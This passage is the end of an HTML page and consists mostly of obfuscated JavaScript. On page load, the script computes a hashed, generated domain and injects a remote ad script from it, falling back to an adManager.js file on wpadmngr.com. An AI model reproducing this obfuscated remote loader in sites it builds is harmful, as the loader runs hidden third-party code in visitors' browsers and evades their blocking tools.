(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>